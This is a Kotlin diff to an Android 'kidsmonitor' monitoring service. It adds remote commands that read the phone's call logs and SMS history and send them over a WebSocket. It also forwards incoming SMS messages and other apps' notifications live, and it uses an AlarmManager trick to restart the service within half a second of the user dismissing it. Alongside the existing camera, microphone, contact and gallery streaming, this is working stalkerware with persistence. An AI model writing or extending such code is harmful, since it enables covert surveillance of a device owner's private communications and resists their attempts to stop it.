@@ -22,11 +22,14 @@ import com.google.gson.Gson
 import com.google.gson.JsonParser
 import com.google.gson.reflect.TypeToken
 import com.kidsmonitor.R
+import com.kidsmonitor.receivers.BootReceiver
 import com.kidsmonitor.audio.AudioStreamer
 import com.kidsmonitor.camera.CameraFacing
 import com.kidsmonitor.camera.CameraStreamer
 import com.kidsmonitor.utils.ContactManager
 import com.kidsmonitor.utils.GalleryManager
+import com.kidsmonitor.utils.CallLogManager
+import com.kidsmonitor.utils.SmsHistoryManager
 import com.kidsmonitor.utils.MonitorActions
 import org.java_websocket.client.WebSocketClient
 import org.java_websocket.handshake.ServerHandshake
@@ -301,6 +304,24 @@ class MonitorService : LifecycleService() {
                     sendStatus("Error: Storage Permission Missing")
                 }
             }
+            "get_call_logs" -> {
+                if (hasPermission(Manifest.permission.READ_CALL_LOG)) {
+                    val logs = CallLogManager(this).getCallLogs()
+                    val response = JsonCommand("call_logs_list", mapOf("data" to Gson().toJson(logs)))
+                    if (::wsClient.isInitialized && wsClient.isOpen) wsClient.send(Gson().toJson(response))
+                } else {
+                    sendStatus("Error: Call Log Permission Missing")
+                }
+            }
+            "get_sms_logs" -> {
+                if (hasPermission(Manifest.permission.READ_SMS)) {
+                    val smsList = SmsHistoryManager(this).getSmsLogs()
+                    val response = JsonCommand("sms_list", mapOf("data" to Gson().toJson(smsList)))
+                    if (::wsClient.isInitialized && wsClient.isOpen) wsClient.send(Gson().toJson(response))
+                } else {
+                    sendStatus("Error: SMS Permission Missing")
+                }
+            }
             "get_status" -> {
                 val status = Status(cameraStreamer.isStreaming(), isMicOn)
                 val statusMsg = JsonCommand("status_update", mapOf(
@@ -336,6 +357,36 @@ class MonitorService : LifecycleService() {
             MonitorActions.ACTION_UPDATE_CONFIG -> {
                 if (::wsClient.isInitialized && wsClient.isOpen) {
                     sendRegistration()
+                }
+            }
+            "com.kidsmonitor.action.PUSH_LIVE_SMS" -> {
+                val sender = intent.getStringExtra("sender") ?: "Unknown"
+                val body = intent.getStringExtra("body") ?: ""
+                val timestamp = intent.getStringExtra("timestamp") ?: ""
+                val payload = JsonCommand("live_sms", mapOf(
+                    "sender" to sender,
+                    "body" to body,
+                    "timestamp" to timestamp
+                ))
+                if (::wsClient.isInitialized && wsClient.isOpen) {
+                    wsClient.send(Gson().toJson(payload))
+                }
+            }
+            "com.kidsmonitor.action.PUSH_LIVE_NOTIFICATION" -> {
+                val packageName = intent.getStringExtra("packageName") ?: ""
+                val appName = intent.getStringExtra("appName") ?: ""
+                val title = intent.getStringExtra("title") ?: ""
+                val text = intent.getStringExtra("text") ?: ""
+                val timestamp = intent.getStringExtra("timestamp") ?: ""
+                val payload = JsonCommand("live_notification", mapOf(
+                    "packageName" to packageName,
+                    "appName" to appName,
+                    "title" to title,
+                    "text" to text,
+                    "timestamp" to timestamp
+                ))
+                if (::wsClient.isInitialized && wsClient.isOpen) {
+                    wsClient.send(Gson().toJson(payload))
                 }
             }
         }
@@ -416,10 +467,21 @@ class MonitorService : LifecycleService() {
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        val restartServiceIntent = Intent(applicationContext, this.javaClass)
-        restartServiceIntent.setPackage(packageName)
-        restartServiceIntent.action = MonitorActions.ACTION_START_MONITORING
-        startService(restartServiceIntent)
+        val restartIntent = Intent(applicationContext, BootReceiver::class.java).apply {
+            action = "com.kidsmonitor.action.RESTART_SERVICE"
+        }
+        val pendingIntent = android.app.PendingIntent.getBroadcast(
+            applicationContext,
+            1,
+            restartIntent,
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_ONE_SHOT else android.app.PendingIntent.FLAG_ONE_SHOT
+        )
+        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+        alarmManager.set(
+            android.app.AlarmManager.RTC_WAKEUP,
+            System.currentTimeMillis() + 500,
+            pendingIntent
+        )
         super.onTaskRemoved(rootIntent)
     }
 
